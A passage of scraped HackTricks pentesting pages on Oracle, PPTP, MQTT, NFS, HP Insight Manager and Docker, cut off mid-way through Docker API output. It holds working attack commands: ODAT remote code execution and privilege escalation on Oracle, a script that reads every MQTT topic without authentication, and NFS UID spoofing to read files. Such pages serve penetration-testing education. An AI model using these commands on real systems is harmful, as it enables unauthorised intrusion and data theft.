DBA).\n‚Äã\nWiki odat\n‚Äã\nRemote Code Execution\nThere are at least two different ways to execute commands, such as by using Java procedures and DBMS_SCHEDULER package. By the way, you can also achieve RCE in case of SQL injection in a web application provided, of course, that the user running it has sufficient rights. At this stage, I highly recommend preparing the Oracle Database Attacking Tool:\nODAT\n.\nInstall ODAT\ngit\nclone https://github.com/quentinhardy/odat.git\ncd\nodat\n./odat.py\n#It shouldn't be problems in Kali\nExecute Code via Java Stored Procedure\n./odat.py\njava\n-s\n<\nIP\n>\n-U\n<\nusername\n>\n-P\n<\npassword\n>\n-d\n<\nSID\n>\n--exec\nCOMMAND\n‚Äã\nMore details here\n‚Äã\nExecute code via Scheduler\n./odat.py dbmsscheduler\n-s\n<\nIP\n>\n-d\n<\nSID\n>\n-U\n<\nusername\n>\n-P\n<\npassword\n>\n--exec\n\"C:\\windows\\system32\n\\c\nmd.exe /c echo 123&gt;&gt;C:\\hacK\"\n‚Äã\nMore details here\n‚Äã\nExecute code via External Tables\n./odat.py externaltable\n-s\n<\nIP\n>\n-U\n<\nusername\n>\n-P\n<\npassword\n>\n-d\n<\nSID\n>\n--exec\n\"C:/windows/system32\"\n\"calc.exe\"\n‚ÄòODAT.py‚Äô requires the privilege ‚ÄòCREATE ANY DIRECTORY‚Äô, which, by default, is granted only to DBA role, since it attempts to execute the file from any and not only ‚Äúyour‚Äù directory (the manual version of this attack requires less privileges).\n‚Äã\nMore details here.\n‚Äã\nRead/Write files\n./odat.py utlfile\n-s\n<\nIP\n>\n-d\n<\nSID\n>\n-U\n<\nusername\n>\n-P\n<\npassword\n>\n--getFile\n\"C:/test\"\ntoken.txt token.txt\n./odat.py externaltable\n-s\n<\nIP\n>\n-U\n<\nusername\n>\n-P\n<\npassword\n>\n-d\n<\nSID\n>\n--getFile\n\"C:/test\"\n\"my4.txt\"\n\"my\"\n‚Äã\nMore details here\n‚Äã\nElevating Privileges\n‚Äã\nMore details here\n‚Äã\nYou can use the\nprivesc\nmodule from odat to escalate privileges. In that link you can find\nseveral ways to escalate privileges using odat.\n./odat.py privesc\n-s\n$SERVER\n-d\n$ID\n-U\n$USER\n-P\n$PASSWORD\n-h\n#Get module Help\nVulnerability tested on oracle 10.1.0.3.0 ‚Äì should work on thru 10.1.0.5.0 and supposedly on 11g. Fixed with Oracle Critical Patch update October 2007.\nmsf\n>\nuse auxiliary/sqli/oracle/lt_findricset_cursor\nFree Virtual Environment for testing\nIf you want to practice attacking Oracle databases, the safest way is to register for the Oracle Developer Days Virtualbox VM:\nDeveloper Day - Hands-on Database Application Development\nMost part of the information in this post was extracted from:\nhttps://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573\nand from\nhttps://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/\n‚Äã\nOther interesting\nreferences\n:\n‚Äã\nhttp://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html\n‚Äã\nHackTricks Automatic Commands\nProtocol_Name: Oracle    #Protocol Abbreviation if there is one.\nPort_Number:  1521     #Comma separated if there is more than one.\nProtocol_Description: Oracle TNS Listener         #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for Oracle\nNote: |\nOracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation\n‚Äã\n#great oracle enumeration tool\nnavigate to https://github.com/quentinhardy/odat/releases/\ndownload the latest\ntar -xvf odat-linux-libc2.12-x86_64.tar.gz\ncd odat-libc2.12-x86_64/\n./odat-libc2.12-x86_64 all -s 10.10.10.82\n‚Äã\nfor more details check https://github.com/quentinhardy/odat/wiki\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener\n‚Äã\nEntry_2:\nName: Nmap\nDescription: Nmap with Oracle Scripts\nCommand: nmap --script \"oracle-tns-version\" -p 1521 -T4 -sV {IP}\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nTypes of MSSQL Users\nNext\nOracle Pentesting requirements installation\nLast modified\n6mo ago"
    },
    {
        "title": "1723 - Pentesting PPTP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/1723-pentesting-pptp",
        "text": "1723 - Pentesting PPTP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nCommonly used to provide remote access to mobile devices, Point-to-Point Tunneling Protocol (PPTP) uses TCP port 1723 for key exchange and IP protocol 47 (GRE) to encrypt data between peers.\nDefault Port\n:1723\nEnumeration\nnmap ‚ÄìPn\n-sSV\n-p1723\n<\nIP\n>\n‚Äã\nBrute Force\n‚Äã\nVulnerabilities\nAnalysis of Microsoft PPTP Version 2\nSchneier on Security\nGitHub - moxie0/chapcrack\nGitHub\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nOracle RCE & more\nNext\n- Network Services Pentesting\n1883 - Pentesting MQTT (Mosquitto)\nLast modified\n6mo ago"
    },
    {
        "title": "1883 - Pentesting MQTT (Mosquitto)",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/1883-pentesting-mqtt-mosquitto",
        "text": "1883 - Pentesting MQTT (Mosquitto)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nMQTT stands for MQ Telemetry Transport. It is a publish/subscribe,\nextremely simple and lightweight messaging protocol\n, designed for constrained devices and low-bandwidth, high-latency or unreliable networks. The design principles are to minimise network bandwidth and device resource requirements whilst also attempting to ensure reliability and some degree of assurance of delivery. These principles also turn out to make the protocol ideal of the emerging ‚Äúmachine-to-machine‚Äù (M2M) or ‚ÄúInternet of Things‚Äù world of connected devices, and for mobile applications where bandwidth and battery power are at a premium.\nDefault port:\n1883\nPORT     STATE SERVICE                 REASON\n1883/tcp open  mosquitto version 1.4.8 syn-ack\nInspecting the traffic\nMQTT brokers send a\nCONNACK\npacket in\nresponse\nto a CONNECT packet. The\nreturn code 0x00\nindicates the credentials are valid and the return code\n0x05 indicates they aren't. 0x05 example:\n‚Äã\nBrute-Force MQTT\n‚Äã\nPentesting MQTT\nAuthentication is totally optional\nand even if authentication is being performed,\nencryption is not used by default\n(credentials are sent in clear text). MITM attacks can still be executed to steal passwords.\nTo connect to a MQTT service you can use:\nhttps://github.com/bapowell/python-mqtt-client-shell\nand subscribe yourself to all the topics doing:\n> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)\n> subscribe \"#\" 1\n> subscribe \"$SYS/#\"\nYou could also use\nhttps://github.com/akamai-threat-research/mqtt-pwn\n‚Äã\nYou can also use:\napt-get\ninstall\nmosquitto mosquitto-clients\nmosquitto_sub\n-t\n'test/topic'\n-v\n#Subscriribe to 'test/topic'\nOr you could\nrun this code to try to connect to a MQTT service without authentication, subscribe to every topic and listen them\n:\n#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py\nimport\npaho\n.\nmqtt\n.\nclient\nas\nmqtt\nimport\ntime\nimport\nos\n‚Äã\nHOST\n=\n\"127.0.0.1\"\nPORT\n=\n1883\n‚Äã\ndef\non_connect\n(\nclient\n,\nuserdata\n,\nflags\n,\nrc\n):\nclient\n.\nsubscribe\n(\n'#'\n,\nqos\n=\n1\n)\nclient\n.\nsubscribe\n(\n'$SYS/#'\n)\n‚Äã\ndef\non_message\n(\nclient\n,\nuserdata\n,\nmessage\n):\nprint\n(\n'Topic: %s | QOS: %s  | Message: %s'\n%\n(\nmessage\n.\ntopic\n,\nmessage\n.\nqos\n,\nmessage\n.\npayload\n))\n‚Äã\ndef\nmain\n():\nclient\n=\nmqtt\n.\nClient\n()\nclient\n.\non_connect\n=\non_connect\nclient\n.\non_message\n=\non_message\nclient\n.\nconnect\n(\nHOST\n,\nPORT\n)\nclient\n.\nloop_start\n()\n#time.sleep(10)\n#client.loop_stop()\n‚Äã\nif\n__name__\n==\n\"__main__\"\n:\nmain\n()\nMore information\nfrom here:\nhttps://morphuslabs.com/hacking-the-iot-with-mqtt-8edaf0d07b9b\n‚Äã\nThe Publish/Subscribe Pattern\nThe publish/subscribe model is composed of:\nPublisher\n: publishes a message to one (or many) topic(s) in the broker.\nSubscriber\n: subscribes to one (or many) topic(s) in the broker and receives all the messages sent from the publisher.\nBroker\n: routes all the messages from the publishers to the subscribers.\nTopic\n: consists of one or more levels that are separated by a a forward slash (e.g., /smartshouse/livingroom/temperature).\nPacket Format\nEvery MQTT packet contains a fixed header (Figure 02).Figure 02: Fixed Header\nThe first field of the fixed header represents the type of the MQTT Packet. All packet types are listed in table 01.Table 01: MQTT Packet Types\nShodan\nport:1883 MQTT\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n1723 - Pentesting PPTP\nNext\n- Network Services Pentesting\n2049 - Pentesting NFS Service\nLast modified\n6mo ago"
    },
    {
        "title": "2049 - Pentesting NFS Service",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting",
        "text": "2049 - Pentesting NFS Service\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nIt is a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory. It has the same purpose as SMB but it cannot talk to SMB.\nThe NFS protocol has\nno mechanism for authentication\nor\nauthorization\n. The authorization is taken from the available information of the file system where the server is responsible for translating the\nuser information\nsupplied by the\nclient\nto that of the\nfile system\nand converting the corresponding authorization information as correctly as possible into the syntax required by UNIX.\nThe most common\nauthentication is via UNIX\nUID\n/\nGID\nand\ngroup memberships\n, which is why this syntax is most likely to be applied to the NFS protocol. One problem is that the\nclient\nand\nserver\ndo\nnot necessarily\nhave to have the\nsame mappings of UID/GID\nto users and groups. No further checks can be made on the part of the server. This is why NFS should\nonly\nbe used with this authentication method in\ntrusted networks\n.\nDefault port\n: 2049/TCP/UDP (except version 4, it just needs TCP or UDP).\n2049/tcp open  nfs     2-3 (RPC #100003\nVersions\n(From\nhttps://academy.hackthebox.com/module/112/section/1068\n)\nVersion\nFeatures\nNFSv2\nIt is\nolder\nbut is supported by many systems and was initially operated entirely over UDP.\nNFSv3\nIt has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.\nNFSv4\nIt includes Kerberos, works through firewalls and on the Internet,\nno longer requires portmappers\n, supports ACLs, applies state-based operations, and provides performance improvements and high\nsecurity\n. It is also the first version to have a stateful protocol.\nEnumeration\nUseful nmap scripts\nnfs-ls\n#List NFS exports and check permissions\nnfs-showmount\n#Like showmount -e\nnfs-statfs\n#Disk statistics and info from NFS share\nUseful metasploit modules\nscanner/nfs/nfsmount\n#Scan NFS mounts and list permissions\nMounting\nTo know\nwhich folder\nhas the server\navailable\nto mount you an ask it using:\nshowmount\n-e\n<\nIP\n>\nThen mount it using:\nmount\n-t\nnfs\n[\n-o\nvers\n=\n2\n]\n<\nip\n>\n:\n<\nremote_folder\n>\n<\nlocal_folder\n>\n-o\nnolock\nYou should specify to\nuse version 2\nbecause it doesn't have\nany\nauthentication\nor\nauthorization\n.\nExample:\nmkdir\n/mnt/new_back\nmount\n-t\nnfs\n[\n-o\nvers\n=\n2\n]\n10.12\n.0.150:/backup /mnt/new_back\n-o\nnolock\nPermissions\nIf you mount a folder which contains\nfiles or folders only accesible by some user\n(by\nUID\n). You can\ncreate\nlocally\na user with that\nUID\nand using that\nuser\nyou will be able to\naccess\nthe file/folder.\nNSFShell\nTo easily list, mount and change UID and GID to have access to files you can use\nnfsshell\n.\n‚Äã\nNice NFSShell tutorial.\n‚Äã\nConfig files\n/etc/exports\n/etc/lib/nfs/etab\nDangerous settings\n(From\nhttps://academy.hackthebox.com/module/112/section/1068\n)\nOption\nDescription\nrw\nRead and write permissions.\ninsecure\nPorts above 1024 will be used.\nnohide\nIf another file system was mounted below an exported directory, this directory is exported by its own exports entry.\nno_root_squash\nAll files created by root are kept with the UID/GID 0.\nno_all_squash\n‚Äã\nPrivilege Escalation using NFS misconfigurations\n‚Äã\nNFS no_root_squash and no_all_squash privilege escalation\n‚Äã\nHackTricks Automatic Commands\nProtocol_Name: NFS    #Protocol Abbreviation if there is one.\nPort_Number:  2049     #Comma separated if there is more than one.\nProtocol_Description: Network File System         #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for NFS\nNote: |\nIt is a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory.\n‚Äã\n#apt install nfs-common\nshowmount 10.10.10.180      ~or~showmount -e 10.10.10.180\nshould show you available shares (example /home)\n‚Äã\nmount -t nfs -o ver=2 10.10.10.180:/home /mnt/\ncd /mnt\nnano into /etc/passwd and change the uid (probably 1000 or 1001) to match the owner of the files if you are not able to get in\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/nfs-service-pentesting\n‚Äã\nEntry_2:\nName: Nmap\nDescription: Nmap with NFS Scripts\nCommand: nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 {IP}\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n1883 - Pentesting MQTT (Mosquitto)\nNext\n- Network Services Pentesting\n2301,2381 - Pentesting Compaq/HP Insight Manager\nLast modified\n6mo ago"
    },
    {
        "title": "2301,2381 - Pentesting Compaq/HP Insight Manager",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-compaq-hp-insight-manager",
        "text": "2301,2381 - Pentesting Compaq/HP Insight Manager\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nDefault Port:\n2301,2381\nDefault passwords\nVulnerabilityAssessment.co.uk\nConfig files\npath.properties\nmx.log\nCLIClientConfig.cfg\ndatabase.props\npg_hba.conf\njboss-service.xml\n.namazurc\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n2049 - Pentesting NFS Service\nNext\n- Network Services Pentesting\n2375, 2376 Pentesting Docker\nLast modified\n6mo ago"
    },
    {
        "title": "2375, 2376 Pentesting Docker",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker",
        "text": "2375, 2376 Pentesting Docker\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nDocker Basics\nWhat is\nThe Docker Platform is the industry-leading container platform for continuous, high-velocity innovation, enabling organizations to seamlessly build and share any application ‚Äî from legacy to what comes next ‚Äî and securely run them anywhere.\nBasic docker architecture\nThis info is from\nhere\n.\n‚Äã\ncontainerd\nis a container runtime which can m\nanage a complete container lifecycle - from image transfer/storage to container execution\n, supervision and networking.\nMore information about containerd below.\ncontainer-shim handle headless containers, meaning once runc initializes the containers, it exits handing the containers over to the container-shim which acts as some middleman.\n‚Äã\nrunc\nis lightweight universal run time container, which abides by the OCI specification.\nrunc is used by containerd for spawning and running containers according to OCI spec\n. It is also the repackaging of libcontainer.\n‚Äã\ngrpc\nused for communication between containerd and docker-engine.\n‚Äã\nOCI\nmaintains the OCI specification for runtime and images. The current docker versions support OCI image and runtime specs.\nrunC, containerD\nBasic commands\ndocker\nversion\n#Get version of docker client, API, engine, containerd, runc, docker-init\ndocker\ninfo\n#Get more infomarion about docker settings\ndocker\npull registry:5000/alpine\n#Download the image\ndocker\ninspect\n<\ncontainerid\n>\n#Get info of the contaienr\ndocker\nnetwork\nls\n#List network info\ndocker\nexec\n-it\n<\ncontainerid\n>\n/bin/sh\n#Get shell inside a container\ndocker\ncommit\n<\ncotainerid\n>\nregistry:5000/name-container\n#Update container\ndocker\nexport\n-o\nalpine.tar\n<\ncontainerid\n>\n#Export container as tar file\ndocker\nsave\n-o\nubuntu.tar\n<\nimage\n>\n#Export an image\ndocker\nps\n-a\n#List running and stopped containers\ndocker\nstop\n<\ncontainedID\n>\n#Stop running container\ndocker\nrm\n<\ncontainerID\n>\n#Remove container ID\ndocker\nimage\nls\n#List images\ndocker\nrmi\n<\nimgeID\n>\n#Remove image\ndocker\nsystem prune\n-a\n#This will remove:\n#  - all stopped containers\n#  - all networks not used by at least one container\n#  - all images without at least one container associated to them\n#  - all build cache\nContainerd\nContainerd was designed to be used by Docker and Kubernetes as well as any other container platform that wants to\nabstract away syscalls or OS specific functionality to run container\ns on linux, windows, solaris, or other OSes. With these users in mind, we wanted to make sure that containerd has only what they need and nothing that they don‚Äôt. Realistically this is impossible but at least that is what we try for. Things like\nnetworking are out of scope for containerd\n. The reason for this is, when you are building a distributed system, networking is a very central aspect. With SDN and service discovery today, networking is way more platform specific than abstracting away netlink calls on linux.\nNote then that\nDocker uses Containerd, but it only provides a subet of the features that Docker provides\n. So for example ContainerD doesn't have Docker's network management features, nor can you use ContainerD alone to create Docker swarms.\n#Containerd CLI\nctr images pull --skip-verify --plain-http registry:5000/alpine:latest\n#Get image\nctr images list\n#List images\nctr container create registry:5000/alpine:latest alpine\n#Create container called alpine\nctr container list\n#List containers\nctr container info\n<\ncontainerName\n>\n#Get container info\nctr task start\n<\ncontainerName\n>\n#You are given a shell inside of it\nctr task list\n#Get status of containers\nctr tasks attach\n<\ncontainerName\n>\n#Get shell in running container\nctr task pause\n<\ncontainerName\n>\n#Stop container\nctr tasks resume\n<\ncontainerName\n>\n#Resume cotainer\nctr task\nkill\n-s\nSIGKILL\n<\ncontainerName\n>\n#Stop running container\nctr container delete\n<\ncontainerName\n>\nPodman\nInfo\nfrom here\n‚Äã\nPodman is an open source, OCI (\nOpen Container Initiative\n) compliant container engine. It is driven by Red Hat and incorporates a few major differences from Docker, such as its daemonless architecture and support for rootless containers. At their core,\nboth tools do the same thing: manage images and containers\n. One of\nPodman‚Äôs objectives is to have a Docker-compatible API\n. Hence almost all CLI (command line interface) commands from the Docker CLI are also available in Podman.\nYou may find two other tools in the Podman ecosystem: Buildah and Skopeo. Buildah is a CLI tool used to build container images, and Skopeo is a CLI tool for running operations on images, such as push, pull or inspect.\nPlease check out GitHub\nfor more information on these tools and their relationship with Podman.\nThe major differences\nThe greatest difference between Docker and Podman is their architecture\n.\nDocker\nruns on a\nclient-server\narchitecture, while\nPodman\nruns on a\ndaemonless\narchitecture. But what does that mean? When working with\nDocker\n, you have to use the Docker CLI, which communicates with a\nbackground daemon\n(the Docker daemon). The main logic resides in the daemon, which builds images and executes containers. This\ndaemon runs with root privileges\n. The\nPodman\narchitecture by contrast allows you to\nrun\nthe\ncontainers under the user that is starting the container\n(fork/exec), and this user does not need any root privileges. Because\nPodman has a daemonless architecture, each user running Podman can only see and modify their own containers\n. There is no common daemon that the CLI tool communicates with.\nSince Podman does not have a daemon, it needs a way to support running containers in the background. It therefore provides an integration with\nsystemd\n, which allows containers to be controlled via systemd units. Depending on the Podman version, you can generate these units for existing containers or generate units that are able to create containers if they do not exist in the system. There is another integration model with systemd, which enables systemd to run inside a container. By default, Docker uses systemd to control the daemon process.\nThe second major difference concerns how containers are executed. With\nPodman\n,\ncontainers are executed under the user‚Äôs privileges and not under the daemon\n. At this point, the concept of rootless containers comes into play, meaning that the container can be started without root privileges. Rootless containers have a huge advantage over rootful containers since (you guessed it) they do not run under the root account. The benefit of this is that if an attacker is able to capture and escape a container, this attacker is still a normal user on the host. Containers that are started by a user cannot have more privileges or capabilities than the user itself. This adds a natural layer of protection.\nNote that as podam aims to support the same API as docker, you can use the same commands with podman as with docker such as:\npodman\n--version\npodman\ninfo\npdoman images\nls\npodman\nls\nBasic Information\nRemote API is running by default on 2375 port when enabled. The service by default will not require authentication allowing an attacker to start a privileged docker container. By using the Remote API one can attach hosts / (root directory) to the container and read/write files of the host‚Äôs environment.\nDefault port:\n2375\nPORT    STATE SERVICE\n2375/tcp open  docker\nEnumeration\nManual\nNote that in order to enumerate the docker API you can use the\ndocker\ncommand or\ncurl\nlike in the following example:\n#Using curl\ncurl\n-s\nhttp://open.docker.socket:2375/version\n|\njq\n#Get version\n{\n\"Platform\"\n:\n{\n\"Name\"\n:\n\"Docker Engine - Community\"\n}\n,\n\"Components\"\n:\n[{\n\"Name\"\n:\n\"Engine\"\n,\n\"Version\"\n:\n\"19.03.1\"\n,\n\"Details\"\n:\n{\n\"ApiVersion\"\n:\n\"1.40\"\n,\n\"Arch\"\n:\n\"amd64\"\n,\n\"BuildTime\"\n:\n\"2019-07-25T21:19:41.000000000+00:00\"\n,\n\"Experimental\"\n:\n\"false\"\n,\n\"GitCommit\"\n:\n\"74b1e89\"\n,\n\"GoVersion\"\n:\n\"go1.12.5\"\n,\n\"KernelVersion\"\n:\n\"5.0.0-20-generic\"\n,\n\"MinAPIVersion\"\n:\n\"1.12\"\n,\n\"Os\"\n:\n\"linux\"\n}}\n,\n{\n\"Name\"\n:\n\"containerd\"\n,\n\"Version\"\n:\n\"1.2.6\"\n,\n\"Details\"\n:\n{\n\"GitCommit\"\n:\n\"894b81a4b802e4eb2a91d1ce216b8817763c29fb\"\n}}\n,\n{\n\"Name\"\n:\n\"runc\"\n,\n\"Version\"\n:\n\"1.0.0-rc8\"\n,\n\"Details\"\n:\n{\n\"GitCommit\"\n:\n\"425e105d5a03fabd737a126ad93d62a9eeede87f\"\n}}\n,\n{\n\"Name\"\n:\n\"docker-init\"\n,\n\"Version\"\n:\n\"0.18.0\"\n,\n\"Details\"\n:\n{\n\"GitCommit\"\n:\n\"fec3683\"\n}}]\n,\n\"Version\"\n:\n\"19.03.1\"\n,\n\"ApiVersion\"\n:\n\"1.40\"\n,\n\"MinAPIVersion\"\n:\n\"1.12\"\n,\n\"GitCommit\"\n:\n\"74b1e89\"\n,\n\"GoVersion\"\n:\n\"go1.12.5\"\n,\n\"Os\"\n:\n\"linux\"\n,\n\"Arch\"\n:\n\"amd64\"\n,\n\"KernelVersion\"\n:\n\"5.0.0-20-generic\"\n,\n\"BuildTime\"\n:\n\"2019-07-25T21:19:41.000000000+00:00\"\n}\n‚Äã\n#Using docker\ndocker\n-H\nopen.docker.socket:2375 version\n#Get version\nClient: Docker Engine - Community\nVersion:\n19.03\n.1\nAPI version:\n1.40\nGo version:        go1.12.5\nGit commit:        74b1e89\nBuilt:             Thu Jul\n25\n21\n:21:05\n2019\nOS/Arch:           linux/amd64\nExperimental:\nfalse\n‚Äã\nServer: Docker Engine - Community\nEngine:\nVersion:\n19.03\n.1\nAPI version:\n1.40\n(\nminimum version\n1.12\n)\nGo version:       go1.12.5\nGit commit:       74b1e89\nBuilt:            Thu Jul\n25\n21\n:19:41\n2019\nOS/Arch:          linux/amd64\nExperimental:\nfalse\ncontainerd:\nVersion:\n1.2\n.6\nGitCommit:        